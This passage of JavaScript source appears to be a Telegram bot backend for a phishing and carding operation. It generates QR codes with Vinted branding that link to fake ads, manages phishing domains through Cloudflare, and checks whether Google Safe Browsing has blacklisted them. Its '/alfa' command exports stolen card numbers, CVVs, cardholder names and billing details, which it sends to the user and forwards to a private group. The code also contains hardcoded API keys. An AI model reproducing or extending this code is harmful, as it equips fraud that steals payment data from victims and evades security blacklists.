    const service = await Service.findOne({
      where: {
        code: ad.serviceCode,
      },
    });
    if (!ad) {
      return ctx.reply("❌ Объявление не найдено");
    }

    // Здесь предполагаем, что мы используем URL объявления для QR-кода

    const options = {
      method: "GET",
      url: "https://qrcode-monkey.p.rapidapi.com/qr/custom",
      params: {
        data: `https://${service.domain}/${ad.id}`, // Замените URL на ваш текст или URL
        config: JSON.stringify({
          bodyColor: "#007889",
          eye1Color: "#007889",
          eye2Color: "#007889",
          eye3Color: "#007889",
          eyeBall1Color: "#007889",
          eyeBall2Color: "#007889",
          eyeBall3Color: "#007889",
          body: "square", // Вы можете изменить это на другой стиль, если хотите
          logo: "https://assets-global.website-files.com/64a451e94283e66242793f67/6559299e0ef35b5c9259a16e_Vinted.png", // Ссылка на ваше лого
          // Другие параметры конфигурации
        }),
        download: "true",
        file: "png",
        size: "600",
      },
      headers: {
        "X-RapidAPI-Key": "b610e84089mshc17c1233736e15fp1cea94jsn61fa42e5e870",
        "X-RapidAPI-Host": "qrcode-monkey.p.rapidapi.com",
      },
      responseType: "arraybuffer", // Указываем, что ожидаем бинарные данные
    };

    const response = await axios.request(options);
    const caption = "<b>✅ QR-Code успешно сгенерирован.</b>"; // Установите подпись к фото
    await ctx.replyWithPhoto(
      { source: Buffer.from(response.data) },
      {
        caption: caption,
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("❌ ", `delete`)],
        ]),
      }
    );
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка при генерации QR-кода").catch((err) => err);
  }
});

bot.action("settings_my_domains", mydomains);
bot.action(/^share_domain_(\d+)$/, async (ctx) => {
  ctx.session.shareDomainId = ctx.match[1];
  return ctx.scene.enter("share_domain");
});

bot.action(/^my_domains_(\d+)$/, async (ctx) => {
  try {
    const domainId = ctx.match[1];
    const domain = await MyDomains.findOne({ where: { id: domainId } });
    if (!domain) return ctx.answerCbQuery("❌ Домен не найден", true);

    const settings = await Settings.findOne({ where: { id: 1 } });

    let level = null;
    let statusText = "🛡 Капча: <b>⚠️ неизвестно</b>";

    // Пробуем получить статус зоны
    try {
      const cfRes = await axios.get(
        `https://api.cloudflare.com/client/v4/zones/${domain.zoneId}/settings/security_level`,
        {
          headers: {
            "X-Auth-Email": settings.cf_mail,
            "X-Auth-Key": settings.cf_api,
            "Content-Type": "application/json",
          },
        }
      );
      level = cfRes.data.result.value;
      statusText =
        level === "under_attack"
          ? "🛡 Капча: <b>включена</b>"
          : "🛡 Капча: <b>выключена</b>";
    } catch (err) {
      const status = err.response?.status;
      const code = err.response?.data?.errors?.[0]?.code;
      if (status === 404 || code === 81044) {
        console.warn(`⚠️ Зона не найдена в Cloudflare: ${domain.domain}`);
      } else {
        console.warn(`⚠️ Ошибка при получении статуса капчи:`, err.message);
      }
    }

    // Определяем владельца
    const all = await MyDomains.findAll({
      where: { domain: domain.domain },
      order: [["createdAt", "ASC"]],
    });

    const owner = all[0];
    const isOwner = ctx.from.id === owner.userId;

    const buttons = [
      [
        Markup.callbackButton("🔍 Проверить на КТ", `check_safe_browsing_${domainId}`),
      ],
      [
        Markup.callbackButton("📤 Поделиться доменом", `share_domain_${domainId}`),
      ],

      level === "under_attack"
        ? [Markup.callbackButton("🔴 Выключить капчу", `disable_captcha_${domainId}`)]
        : [Markup.callbackButton("🟢 Включить капчу", `enable_captcha_${domainId}`)],
      [Markup.callbackButton("❌ Удалить домен", `delete_my_domain_${domainId}`)],
      [Markup.callbackButton("◀️ Назад", "settings_my_domains")],
    ];

    const warningText = isOwner
      ? `\n\n⚠️ <b>Внимание:</b> при удалении этого домена он будет недоступен <u>у всех пользователей</u>, с кем вы им поделились.`
      : "";

    await ctx.answerCbQuery("Готово").catch(() => { });
    return ctx.replyOrEdit(
      `🔗 Домен: <code>${domain.domain}</code>\n\n${statusText}${warningText}`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard(buttons),
      }
    );
  } catch (err) {
    console.error("Ошибка при получении домена:", err);
    return ctx.reply("❌ Ошибка").catch(() => { });
  }
});
bot.action(/^check_safe_browsing_(\d+)$/, async (ctx) => {
  try {
    const domainId = ctx.match[1];
    const domain = await MyDomains.findOne({ where: { id: domainId } });
    if (!domain) return ctx.answerCbQuery("❌ Домен не найден", true);

    const apiKey = "AIzaSyAlAOFDNMYOWuSCrOuqejFpvuHBfGn-LUs"; // твой ключ
    const safeBrowsingUrl = `https://safebrowsing.googleapis.com/v4/threatMatches:find?key=${apiKey}`;

    const requestData = {
      client: { clientId: "your-bot", clientVersion: "1.0" },
      threatInfo: {
        threatTypes: ["MALWARE", "SOCIAL_ENGINEERING", "UNWANTED_SOFTWARE"],
        platformTypes: ["ANY_PLATFORM"],
        threatEntryTypes: ["URL"],
        threatEntries: [{ url: `https://${domain.domain}` }],
      },
    };

    const response = await axios.post(safeBrowsingUrl, requestData);
    const matches = response.data?.matches || [];

    const resultText = matches.length
      ? `🚨 ${domain.domain} занесён в чёрный список Google Safe Browsing!`
      : `✅ ${domain.domain} считается безопасным.`;

    return ctx.answerCbQuery(resultText, true);
  } catch (err) {
    console.error("Ошибка при проверке Safe Browsing:", err);
    return ctx.answerCbQuery("❌ Ошибка при проверке", true);
  }
});
async function toggleCaptcha(ctx, domainId, level) {
  try {
    const domain = await MyDomains.findOne({ where: { id: domainId } });
    if (!domain) return ctx.answerCbQuery("❌ Домен не найден", true);

    const settings = await Settings.findOne({ where: { id: 1 } });

    await axios.patch(
      `https://api.cloudflare.com/client/v4/zones/${domain.zoneId}/settings/security_level`,
      { value: level },
      {
        headers: {
          "X-Auth-Email": settings.cf_mail,
          "X-Auth-Key": settings.cf_api,
          "Content-Type": "application/json",
        },
      }
    );

    const label = level === "under_attack" ? "включена" : "выключена";
    await ctx.answerCbQuery(`🛡 Капча ${label}`, true);

    // Обновляем интерфейс
    return bot.handleUpdate({
      callback_query: {
        ...ctx.callbackQuery,
        data: `my_domains_${domainId}`, // вызываем обновление
      },
    });
  } catch (err) {
    console.error("Ошибка при переключении капчи:", err);
    return ctx.answerCbQuery("❌ Ошибка при обновлении", true).catch(() => { });
  }
}

bot.action(/^enable_captcha_(\d+)$/, async (ctx) => {
  await toggleCaptcha(ctx, ctx.match[1], "under_attack");
});

bot.action(/^disable_captcha_(\d+)$/, async (ctx) => {
  await toggleCaptcha(ctx, ctx.match[1], "low");
});

bot.action(/^delete_my_domain_(\d+)$/, async (ctx) => {
  try {
    const domainId = ctx.match[1];
    const settings = await Settings.findOne({ where: { id: 1 } });
    const domain = await MyDomains.findOne({ where: { id: domainId } });

    if (!domain) {
      return ctx.answerCbQuery("❌ Домен не найден", true);
    }

    const allCopies = await MyDomains.findAll({
      where: { zoneId: domain.zoneId },
      order: [["createdAt", "ASC"]],
    });

    const owner = allCopies[0]; // первый, кто добавил — владелец

    // 🔥 Удаляем DNS-запись в Cloudflare
    try {
      const dnsRecords = await axios.get(
        `https://api.cloudflare.com/client/v4/zones/${domain.zoneId}/dns_records`,
        {
          headers: {
            "X-Auth-Email": settings.cf_mail,
            "X-Auth-Key": settings.cf_api,
            "Content-Type": "application/json",
          },
        }
      );

      const targetRecord = dnsRecords.data.result.find(
        (r) => r.type === "A" && r.name === domain.domain
      );

      if (targetRecord) {
        await axios.delete(
          `https://api.cloudflare.com/client/v4/zones/${domain.zoneId}/dns_records/${targetRecord.id}`,
          {
            headers: {
              "X-Auth-Email": settings.cf_mail,
              "X-Auth-Key": settings.cf_api,
              "Content-Type": "application/json",
            },
          }
        );
      }
    } catch (err) {
      console.warn("⚠️ Не удалось удалить DNS-запись:", err.response?.data || err.message);
    }

    // 🔥 Удаляем свою запись из БД
    await MyDomains.destroy({ where: { id: domain.id } });

    // 🔍 Если пользователь — владелец и это была последняя запись
    if (ctx.from.id === owner.userId) {
      const remaining = await MyDomains.count({ where: { zoneId: domain.zoneId } });

      if (remaining === 0) {
        // Удаляем зону Cloudflare
        try {
          await axios.delete(
            `https://api.cloudflare.com/client/v4/zones/${domain.zoneId}`,
            {
              headers: {
                "X-Auth-Email": settings.cf_mail,
                "X-Auth-Key": settings.cf_api,
                "Content-Type": "application/json",
              },
            }
          );
        } catch (err) {
          const status = err.response?.status;
          const code = err.response?.data?.errors?.[0]?.code;
          if (status === 404 || code === 81044) {
            console.warn(`ℹ️ Зона уже удалена: ${domain.domain}`);
          } else {
            console.warn(
              `⚠️ Ошибка при удалении зоны:`,
              err.response?.data || err.message
            );
          }
        }

        // Уведомляем других пользователей
        for (const u of allCopies) {
          if (u.userId !== owner.userId) {
            await ctx.telegram
              .sendMessage(
                u.userId,
                `⚠️ Домен <b>${domain.domain}</b>, которым с вами ранее поделились, был удалён владельцем и больше не работает.`,
                { parse_mode: "HTML" }
              )
              .catch(() => {});
          }
        }
      }
    }

    await ctx.answerCbQuery("✅ Домен успешно удалён!", true).catch(() => {});
    return require("./commands/MyDomains")(ctx);
  } catch (err) {
    console.error("❌ Ошибка при удалении домена:", err);
    return ctx.reply("❌ Ошибка при удалении домена").catch(() => {});
  }
});

bot.action("delete_my_domains", async (ctx) => {
  try {
    const settings = await Settings.findOne({ where: { id: 1 } });

    const allUserDomains = await MyDomains.findAll({
      where: { userId: ctx.from.id },
    });
    if (allUserDomains.length === 0) {
      await ctx
        .answerCbQuery("У вас нет доменов для удаления", true)
        .catch(() => { });
      return;
    }

    const grouped = {}; // по домену
    for (const d of allUserDomains) {
      if (!grouped[d.domain]) grouped[d.domain] = [];
      grouped[d.domain].push(d);
    }

    for (const domainName in grouped) {
      const domainEntries = await MyDomains.findAll({
        where: { domain: domainName },
        order: [["createdAt", "ASC"]],
      });

      const owner = domainEntries[0];

      if (ctx.from.id === owner.userId) {
        // 👑 Владелец удаляет
        try {
          if (owner.zoneId) {
            await axios.delete(
              `https://api.cloudflare.com/client/v4/zones/${owner.zoneId}`,
              {
                headers: {
                  "X-Auth-Email": settings.cf_mail,
                  "X-Auth-Key": settings.cf_api,
                  "Content-Type": "application/json",
                },
              }
            );
          }
        } catch (err) {
          const status = err.response?.status;
          const code = err.response?.data?.errors?.[0]?.code;
          if (status === 404 || code === 81044) {
            console.warn(`ℹ️ Зона уже удалена: ${domainName}`);
          } else {
            console.warn(
              `⚠️ Ошибка при удалении зоны ${domainName}:`,
              err.response?.data || err.message
            );
          }
        }

        // Уведомляем всех
        for (const entry of domainEntries) {
          if (entry.userId !== ctx.from.id) {
            await ctx.telegram
              .sendMessage(
                entry.userId,
                `⚠️ Домен <b>${domainName}</b>, которым с вами ранее поделились, был удалён владельцем и больше не работает.`,
                { parse_mode: "HTML" }
              )
              .catch(() => { });
          }
        }

        await MyDomains.destroy({ where: { domain: domainName } });
      } else {
        // 👤 Не владелец — удаляем только у пользователя
        await MyDomains.destroy({
          where: { domain: domainName, userId: ctx.from.id },
        });
      }
    }

    await ctx
      .answerCbQuery("✅ Все доступные вам домены были удалены", true)
      .catch(() => { });
    return require("./commands/MyDomains")(ctx);
  } catch (err) {
    console.error("❌ Ошибка при массовом удалении доменов:", err);
    return ctx.reply("❌ Ошибка").catch(() => { });
  }
});

// Команда для выгрузки логов
bot.command("/alfa", async (ctx) => {
  try {
    const commandText = ctx.message.text;
    const [_, startDateRaw, endDateRaw] = commandText.split(" ");

    if (!startDateRaw) {
      return ctx.reply("❌ Укажите хотя бы одну дату в формате <code>/alfa 10-06</code> или две: <code>/alfa 10-06 25-06</code>", { parse_mode: "HTML" });
    }

    const start = moment(startDateRaw, "DD-MM").startOf("day");
    const end = endDateRaw
      ? moment(endDateRaw, "DD-MM").endOf("day")
      : moment().endOf("day");

    if (!start.isValid() || !end.isValid()) {
      return ctx.reply("❌ Неверный формат дат. Используйте DD-MM или DD-MM DD-MM");
    }

    if (end.isBefore(start)) {
      return ctx.reply("❌ Дата окончания раньше даты начала.");
    }

    const logs = await Log.findAll({
      where: {
        createdAt: {
          [Op.between]: [start.toDate(), end.toDate()],
        },
      },
    });

    if (logs.length === 0) {
      return ctx.reply("❌ Логи за указанный период не найдены.");
    }

    const seen = new Set();
    let duplicates = 0;

    const uniqueLogs = [];
    logs.forEach((log) => {
      if (seen.has(log.cardNumber)) {
        duplicates++;
      } else {
        seen.add(log.cardNumber);
        uniqueLogs.push(log);
      }
    });

    const logData = uniqueLogs
      .map((log) => {
        const [mm, yy] = (log.cardExpire || "").split("/") || ["", ""];
        const info = log.otherInfo ?? {};
        const fields = [
          log.cardNumber,
          mm,
          yy,
          log.cardCvv,
          log.cardHolder,
          info.billingAddress,
          info.billingCity,
          info.billingState,
          info.billingZip,
          info.billingCountry,
          info.billingPhone,
          log.email,
          log.ip,
        ];
        const cleanFields = fields.filter((v) => v !== undefined && v !== null);
        return cleanFields.join("|");
      })
      .join("\n");

    const total = logs.length;
    const unique = uniqueLogs.length;

    const fileName = `cards_${start.format("YYYY-MM-DD")}_to_${end.format("YYYY-MM-DD")}.txt`;
    const filePath = path.join(__dirname, "logs", fileName);

    fs.mkdirSync(path.join(__dirname, "logs"), { recursive: true });
    fs.writeFileSync(filePath, logData);

    const caption =
      `<b>✅ Успешный экспорт!</b>\n\n` +
      `📋 Всего карт: <b>${total}</b>\n` +
      `🔁 Дубликатов: <b>${duplicates}</b>\n` +
      `✅ Уникальных: <b>${unique}</b>\n\n` +
      `<i>📥 Пришлите скриншот уникальных карт в лс @haron</i>`;

    await ctx.replyWithDocument(
      { source: filePath, filename: fileName },
      { caption, parse_mode: "HTML" }
    );

    const reportMessage =
      `<b>📤 Новый экспорт карт</b>\n\n` +
      `👤 Пользователь: <b>${ctx.from.username || ctx.from.id}</b>\n` +
      `🗓 Период: <b>${start.format("DD-MM-YYYY")}</b> до <b>${end.format("DD-MM-YYYY")}</b>\n\n` +
      `📋 Всего карт: <b>${total}</b>\n` +
      `🔁 Дубликатов: <b>${duplicates}</b>\n` +
      `✅ Уникальных: <b>${unique}</b>`;

    await ctx.telegram.sendDocument(
      -1002675000159,
      { source: filePath },
      { caption: reportMessage, parse_mode: "HTML" }
    );

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Произошла ошибка при выгрузке логов.");
  }
});


bot.action(/^operatorSend_(\d+)_send_message_(\d+)_(\d+)$/, async (ctx) => {
  const supportId = ctx.match[1];
  const userId = ctx.match[2];
  const adId = ctx.match[3]; // Extract Ad ID from callback data

  // Проверяем, есть ли оператор у воркера
  const user = await User.findOne({ where: { id: userId } });
  if (!user || user.operator == null) {
    return ctx.answerCbQuery(
      "❌ Воркер этого объявления отказался от вас.",
      true
    );
  }

  return ctx.scene.enter("operator_send_message", {
    supportId,
    userId,
    adId, // Pass Ad ID to the scene
  });
});

bot.action(/^operator_select_(\d+)$/, async (ctx) => {
  try {
    // Найти текущего пользователя
    const user = await User.findOne({ where: { id: ctx.from.id } });

    // Найти оператора по его userId из callback data
    const operatorUserId = ctx.match[1];
    const operator = await Operators.findOne({ where: { id: operatorUserId } });

    if (!operator) {
      return ctx.reply("❌ Оператор не найден.").catch((err) => err);
    }
    // Проверить, онлайн ли оператор
    if (!operator.work) {
      return ctx
        .answerCbQuery(
          "❌ Нельзя выбрать этого оператора, он сейчас оффлайн.",
          true
        )
        .catch((err) => err);
    }

    // Проверить, пытается ли оператор выбрать сам себя
    if (operator.userId === ctx.from.id) {
      return ctx
        .answerCbQuery(
          "❌ Вы не можете выбрать себя в качестве оператора.",
          true
        )
        .catch((err) => err);
    }

    // Связать воркера с оператором (обновляем запись оператора у пользователя)
    await user.update({ operator: operator.userId });

    // Уведомить пользователя о том, что оператор был выбран
    await ctx
      .replyOrEdit(`✅ Вы успешно выбрали оператора @${operator.username}.`, {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("◀️ Вернуться в меню", "start")],
        ]),
      })
      .catch((err) => err);

    // Отправить оператору уведомление о том, что его выбрали
    await ctx.telegram
      .sendMessage(
        operator.userId,
        `🔔 Воркер @${ctx.from.username} выбрал вас в качестве своего оператора.`,
        { parse_mode: "HTML" }
      )
      .catch((err) => err);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Произошла ошибка.").catch((err) => err);
  }
});
bot.command("mentors", async (ctx) => {
  try {
    // Получаем всех активных наставников из базы данных
    const mentors = await Nastavniki.findAll();

    // Проверяем, если наставников нет, отправляем сообщение
    if (mentors.length === 0) {
      return ctx.reply("❌ Список наставников пуст.").catch((err) => err);
    }

    // Формируем текст со списком наставников
    const mentorsText = mentors
      .map((mentor) => {
        const status = mentor.status === 1 ? "🟢 Онлайн" : "🔴 Оффлайн";
        return `👨‍🏫 <b>${mentor.username}</b> — ${status}`;
      })
      .join("\n");

    // Отправляем текстовый список наставников
    await ctx.replyWithHTML(`👨‍🏫 <b>Список наставников:</b>\n\n${mentorsText}`);
  } catch (err) {
    console.error(err);
    return ctx
      .reply("❌ Ошибка при получении списка наставников.")
      .catch((err) => err);
  }
});

bot.command("all_operators", async (ctx) => {
  try {
    // Ищем всех операторов в базе данных
    const operators = await Operators.findAll();

    // Проверяем, есть ли операторы
    if (operators.length === 0) {
      return ctx.reply("❌ Нет доступных операторов.");
    }

    // Формируем текст с именами и статусами операторов
    let message = "<b>Список операторов:</b>\n\n";
    operators.forEach((operator) => {
      const status = operator.work ? "🟢 Онлайн" : "🔴 Оффлайн";
      message += `- ${operator.username} (${status})\n`;
    });

    // Отправляем сообщение со списком операторов
    await ctx.replyWithHTML(message, {
      reply_markup: Markup.inlineKeyboard([
        Markup.callbackButton("◀️ Назад", "admin_menu"),
      ]),
    });
  } catch (err) {
    console.error("Ошибка при получении операторов:", err);
    await ctx.reply("❌ Произошла ошибка при получении списка операторов.");
  }
});

bot.action(/^operator_(accept|decline)_(\d+)$/, async (ctx) => {
  try {
    const userId = ctx.match[2];
    const action = ctx.match[1];

    // Reset requestOperator status
    await User.update({ requestOperator: 0 }, { where: { id: userId } });

    // Delete the message that triggered this action
    await ctx.deleteMessage().catch((err) => err);

    if (action === "accept") {
      // Accept the request and set the operator's userId
      await User.update({ operator: ctx.from.id }, { where: { id: userId } });

      await ctx.answerCbQuery("✅ Вы успешно приняли заявку!", true);

      return ctx.telegram.sendMessage(
        userId,
        `✅ Твоя заявка была одобрена, отпиши своему оператору в ЛС!`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.urlButton(
                `👨🏼‍💻 ${ctx.from.username}`,
                `https://t.me/${ctx.from.username}`
              ),
            ],
          ]),
        }
      );
    } else {
      // Decline the request
      await ctx.answerCbQuery("❌ Вы успешно отклонили заявку!", true);

      return ctx.telegram.sendMessage(
        userId,
        `❌ Твоя заявка была отклонена, если не согласен, отпиши оператору в ЛС!`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.urlButton(
                `✏️ ${ctx.from.username}`,
                `https://t.me/${ctx.from.username}`
              ),
            ],
          ]),
        }
      );
    }
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^balance_(show|hide)$/, async (ctx) => {
  const action = ctx.match[1]; // Получаем действие (show или hide) из callback-запроса

  // Обновляем значение balanceChecker в базе данных
  const updatedAd = await Ad.update(
    { balanceChecker: action === "show" ? true : false },
    {
      where: {
        userId: ctx.from.id,
      },
    }
  );

  // Отправляем сообщение об успешном обновлении
  if (updatedAd > 0) {
    ctx.answerCbQuery(
      `✅ Чекер баланса успешно ${action === "show" ? "включен" : "выключен"
      } на всех ссылках`
    );
    return myAds(ctx);
  } else {
    ctx.reply("❌ Не удалось обновить значение чекера баланса");
  }
});
bot.action(/^settings_provider_(square|stripe)$/, async (ctx) => {
  try {
    const newProvider = ctx.match[1];

    await ctx.state.user.update({
      provider: newProvider,
    });

    await ctx
      .answerCbQuery(`✅ Теперь выбрана платёжная система: ${newProvider === "square" ? "Square" : "Stripe"}`)
      .catch((err) => err);

    return settings(ctx); // Обновляет сообщение с интерфейсом настроек
  } catch (err) {
    console.error("Ошибка при смене провайдера:", err);
    return ctx.reply("❌ Ошибка при смене платёжной системы").catch((err) => err);
  }
});
bot.action(/^settings_autochat_(enable|disable)$/, async (ctx) => {
  const action = ctx.match[1];
  const newValue = action === "enable" ? 1 : 0;
  
  // Обновляем в базе данных
  await User.update(
    { autoOpenChat: newValue },
    { where: { id: ctx.from.id } }
  );
  
  // ВАЖНО: Обновляем ctx.state.user чтобы кнопка показала правильное состояние
  ctx.state.user.autoOpenChat = newValue;
  
  // Короткие уведомления
  if (newValue) {
    await ctx.answerCbQuery(
      "✅ Авто-открытие включено!");
  } else {
    await ctx.answerCbQuery(
      "❌ Авто-открытие выключено!\n\nЧат поддержки больше не будет автоматически открываться при получении сообщений мамонту. Открывать придется вручную.",true);
  }
  
  return settings(ctx);
});
bot.action("menu_operator", async (ctx) => {
  try {
    // Находим оператора
    const operator = await Operators.findOne({
      where: { userId: ctx.from.id },
    });

    // Считаем количество профитов
    const profitsCount = await Profit.count({
      where: {
        operator: ctx.from.id,
      },
    });

    // Суммируем профиты
    const totalAmount = await Profit.sum("amount", {
      where: { operator: ctx.from.id },
    });
    const amount = totalAmount ? parseFloat(totalAmount) : 0; // Убедимся, что это число

    // Процент оператора
    const percent = operator.percent ? parseFloat(operator.percent) : 0;

    // Расчет общей суммы в USD с учетом процента
    const totalUSD = (amount * percent) / 100;

    await ctx.answerCbQuery("🙊 Уже открываю ").catch((err) => err);

    // Ответ пользователю
    return ctx
      .replyOrEdit(
        `<b>👨🏼‍💻 Ваша панель оператора</b>

📄 Ваша Анкета: <b>${operator.about == null ? "Отсутствует" : operator.about
        }</b>            
💯 Ваш процент: <b>${operator.percent == null ? "Процент не Указан" : percent
        }</b>

💰 Профитов воркеров: <b>${profitsCount} (${amount} USD)</b>
           
<i>Измените свой статус <b>онлайна</b> на актуальный, чтобы все воркеры видели его.</i>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                operator.work ? "🔴 Оффлайн" : "🟢 Онлайн",
                `operator_status_${operator.work ? "off" : "on"}`
              ),
            ],
            [Markup.callbackButton("👨‍🎓 Воркеры", "operator_students")],

            [
              Markup.callbackButton(
                "💯 Установить процент ",
                "set1_operator_percent"
              ),
              Markup.callbackButton(
                "📄 Установить анкету",
                "set1_operator_about"
              ),
            ],
            [Markup.callbackButton("◀️ Назад", "start")],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action("operator_students", async (ctx) => {
  try {
    const { count, rows } = await User.findAndCountAll({
      where: {
        operator: ctx.from.id,
      },
    });

    var buttons = chunk(
      rows.map((v) =>
        Markup.callbackButton(`@${v.username}`, `manageOperator_${v.id}`)
      ),
      3
    );

    if (buttons.length < 1)
      buttons = [[Markup.callbackButton("Страница пуста", "none")]];
    await ctx.answerCbQuery("👨‍🎓 Получаю воркеров ").catch((err) => err);

    return ctx
      .replyOrEdit(`👨‍🎓 Управление твоими воркерами (Всего: ${count}):`, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          ...buttons,
          [
            Markup.callbackButton(
              "❌ Удалить всех моих воркеров",
              `delete_all_my_students`
            ),
          ],
          [Markup.callbackButton("◀️ Назад", `menu_operator`)],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("delete_all_my_students", async (ctx) => {
  try {
    const userId = ctx.from.id;

    const workers = await User.findAll({
      where: {
        operator: userId,
      },
    });
    if (workers.length === 0) {
      return ctx.answerCbQuery("У вас нет воркеров для удаления", true).catch(() => { });
    }
    // Обновление всех воркеров, установив их operator в null и requestOperator в 0
    await User.update(
      {
        operator: null,
        requestOperator: 0,
      },
      {
        where: {
          operator: userId,
        },
      }
    );
    for (const worker of workers) {
      if (worker.id) {
        // Убедитесь, что у вас есть идентификатор Telegram для каждого воркера
        await ctx.telegram.sendMessage(
          worker.id,
          `👨🏼‍💻 Оператор <b>@${ctx.from.username}</b> отказался от всех своих воркеров, можете написать ему, спросить причину.`,
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.urlButton(
                  "💬 Связаться с оператором",
                  `https://t.me/${ctx.from.username}`
                ),
              ],
            ]),
          }
        );
      }
    }

    await ctx.replyOrEdit("✅ Все воркеры удалены", {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("◀️ Назад", `operator_students`)],
      ]),
    });
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка при удалении воркеров").catch((err) => err);
  }
});

bot.action(/^manageOperator_(\d+)$/, async (ctx) => {
  try {
    const user = await User.findOne({ where: { id: ctx.match[1] } });

    const profitsCount = await Profit.count({
      where: {
        userId: ctx.match[1],
      },
    });

    await ctx.answerCbQuery("👨‍🎓 Получаю воркера ").catch((err) => err);

    return ctx
      .replyOrEdit(
        `👨‍🎓 <b>Воркер:</b> @${user.username}
            
💰 Общее кол-во его профитов: <b>${profitsCount}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                "❌ Удалить",
                `deleteStudent2_${ctx.match[1]}`
              ),
            ],
            [Markup.callbackButton("◀️ Назад", `operator_students`)],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^deleteStudent2_(\d+)$/, async (ctx) => {
  try {
    await User.update(
      {
        operator: null,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );

    await User.update(
      {
        requestOperator: 0,
      },
      { where: { id: ctx.from.id } }
    );
    await ctx.telegram.sendMessage(
      ctx.match[1],
      `<b>👨🏼‍💻 Оператор @${ctx.from.username} отказался от вас.</b> `,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.urlButton(
              "💬 Связаться с оператором",
              `t.me/${ctx.from.username}`
            ),
          ],
        ]),
      }
    );

    return ctx
      .replyOrEdit("✅ Воркер удален", {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("◀️ Назад", `operator_students`)],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("tp", supports);

bot.action(/^operator_status_(off|on)$/, async (ctx) => {
  try {
    const operator = await Operators.findOne({
      where: { userId: ctx.from.id },
    });

    if (!operator) {
      return ctx.reply("❌ Оператор не найден");
    }

    // Получаем идентификатор группы из настроек
    const settings = await Settings.findByPk(1);
    const logsGroupId = settings.allGroupId; // Предполагается, что поле logsGroupId существует в модели Settings

    if (!logsGroupId) {
      console.log("⚠️ logsGroupId не настроен в Settings");
      return ctx.reply("❌ Лог-группа не настроена").catch((err) => err);
    }

    // Ищем воркеров, связанных с этим оператором
    const { count, rows: workers } = await User.findAndCountAll({
      where: {
        operator: operator.userId, // Предполагается, что поле operator в User хранит userId оператора
      },
    });

    if (ctx.match[1] === "off") {
      await Operators.update(
        { work: false },
        { where: { userId: ctx.from.id } }
      );

      const offlineMessage = `<b>❌ @${operator.username
        } покинул обработку ТП.</b>

Описание: ${operator.about ? `<code>${operator.about}</code>` : "<i>отсутствует</i>"
        }`;

      // Уведомление в лог-группу
      await ctx.telegram.sendMessage(logsGroupId, offlineMessage, {
        parse_mode: "HTML",
      });

      // Уведомления ученикам
      for (const worker of workers) {
        try {
          await ctx.telegram.getChat(worker.id);
          await ctx.telegram.sendMessage(
            worker.id,
            `<b>❌ Ваш оператор @${operator.username} покинул обработку ТП.</b>

<i>Вы можете выбрать нового оператора для продолжения работы.</i>`,
            {
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("👨🏼‍💻 Выбрать нового", `tp`)],
              ]),
            }
          );
        } catch (error) {
          if (
            error.code === 403 &&
            error.description === "Forbidden: user is deactivated"
          ) {
          } else {
            console.error(
              `❌ Ошибка при отправке сообщения пользователю ${worker.id}:`,
              error
            );
          }
        }
      }

      await ctx.answerCbQuery("🔴 Теперь вы оффлайн").catch((err) => err);
      await ctx
        .editMessageReplyMarkup(
          Markup.inlineKeyboard([
            [Markup.callbackButton(`🟢 Онлайн`, `operator_status_on`)],
            [Markup.callbackButton("👨‍🎓 Воркеры", "operator_students")],
            [
              Markup.callbackButton(
                "💯 Установить процент ",
                "set1_operator_percent"
              ),
              Markup.callbackButton(
                "📄 Установить анкету",
                "set1_operator_about"
              ),
            ],
            [Markup.callbackButton("◀️ Назад", "start")],
          ])
        )
        .catch((err) => err);
    } else {
      // Для онлайн статуса
      await Operators.update(
        { work: true },
        { where: { userId: ctx.from.id } }
      );

      const onlineMessage = `<b>✅ @${operator.username
        } сел на обработку ТП.</b>

Описание: ${operator.about ? `<code>${operator.about}</code>` : "<i>отсутствует</i>"
        }`;

      // Уведомление в лог-группу
      await ctx.telegram.sendMessage(logsGroupId, onlineMessage, {
        parse_mode: "HTML",
      });

      // Уведомления ученикам
      for (const worker of workers) {
        try {
          await ctx.telegram.getChat(worker.id);
          await ctx.telegram.sendMessage(
            worker.id,
            `<b>✅ Ваш оператор @${operator.username} снова доступен.</b>

<i>Вы можете продолжить работу с ним.</i>`,
            {
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("❌ Скрыть", `delete`)],
              ]),
            }
          );
        } catch (error) {
          if (
            error.code === 403 &&
            error.description === "Forbidden: user is deactivated"
          ) {
          } else {
            console.error(
              `❌ Ошибка при отправке сообщения пользователю ${worker.id}:`,
              error
            );
          }
        }
      }

      await ctx.answerCbQuery("🟢 Теперь вы онлайн").catch((err) => err);
